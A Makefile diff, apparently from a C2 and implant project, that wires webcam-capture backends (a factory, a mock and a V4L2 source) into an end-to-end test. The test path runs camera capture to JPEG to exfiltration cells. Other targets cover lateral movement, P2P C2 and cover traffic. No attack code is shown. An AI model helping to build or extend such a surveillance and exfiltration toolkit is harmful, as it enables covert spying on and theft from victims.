@@ -23,8 +23,15 @@ C2OBJS  := ../14_p2p/build/c2.o ../14_p2p/build/c2_frame.o \
            ../14_p2p/build/crypto_x25519.o
 LATLIB  := ../08_lateral/build/proxy.o ../08_lateral/build/lateral.o
 # agent_windows 跨平台内核：采集 + JPEG 转码（端到端闭环的采集侧）
+# 必须包含 cam_factory.o：cam_source_create / cam_source_destroy 已上移到
+# cam_factory.c，各后端只导出自己的 create_*/destroy_*。少了它，
+# cam_source_create 就是 undefined reference。
+# cam_mock.o 也不可省：test_cam_e2e 用 backend="mock" 跑确定性帧。此前
+# mock 与 v4l2 互斥（都导出 cam_source_create），现在经工厂分发可以共存。
 AGOBJS  := ../agent_windows/build/linux/cam_jpeg.o \
-           ../agent_windows/build/linux/cam_mock.o
+           ../agent_windows/build/linux/cam_mock.o \
+           ../agent_windows/build/linux/cam_factory.o \
+           ../agent_windows/build/linux/cam_linux_v4l2.o
 
 all: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/dump_cells $(BUILD)/dump_task $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_task_resume $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop $(BUILD)/test_cover_circuit $(BUILD)/test_exfil_cover_circuit $(BUILD)/test_exfil_burst_cover \
            $(BUILD)/test_tol
@@ -46,9 +53,14 @@ $(P2PLIB) $(C2OBJS): FORCE
 $(LATLIB): FORCE
 	@$(MAKE) -C ../08_lateral --no-print-directory build/proxy.o build/lateral.o
 
+# 四个都要显式列出。GNU make 会把由模式规则链式推导出的 .o 当作中间文件，
+# 在本次 make 结束时自动 rm 掉——表现为 make 收尾打印一行
+# "rm build/linux/cam_factory.o ..."。显式作为目标给出的文件不会被删，
+# 所以这里必须逐个点名，否则下一轮 AGOBJS 引用时文件已经不存在。
 $(AGOBJS): FORCE
 	@$(MAKE) -C ../agent_windows --no-print-directory \
-	  build/linux/cam_jpeg.o build/linux/cam_mock.o
+	  build/linux/cam_jpeg.o build/linux/cam_mock.o \
+	  build/linux/cam_factory.o build/linux/cam_linux_v4l2.o
 
 FORCE:
 
@@ -125,7 +137,7 @@ $(BUILD)/dump_cells: tests/dump_cells.c $(BUILD)/exfil.o $(LATLIB) $(C2OBJS) $(P
 	$(CC) $(CFLAGS) $< $(BUILD)/exfil.o -o $@ $(LATLIB) $(C2OBJS) $(P2PLIB)
 
 # 端到端：agent_windows 采集 -> JPEG -> exfil 信元 -> 重组校验
-$(BUILD)/test_cam_e2e: tests/test_cam_e2e.c $(BUILD)/exfil.o $(LATLIB) $(C2OBJS) $(AGOBJS) $(P2PLIB)
+$(BUILD)/test_cam_e2e: tests/test_cam_e2e.c $(BUILD)/exfil.o $(LATLIB) $(C2OBJS) $(AGOBJS) $(P2PLIB) FORCE
 	$(CC) $(CFLAGS) $< $(BUILD)/exfil.o -o $@ $(LATLIB) $(C2OBJS) $(AGOBJS) $(P2PLIB)
 
 # 自适应覆盖流量接入真实发送循环：提交 + 泵送（入队-出片交替）。
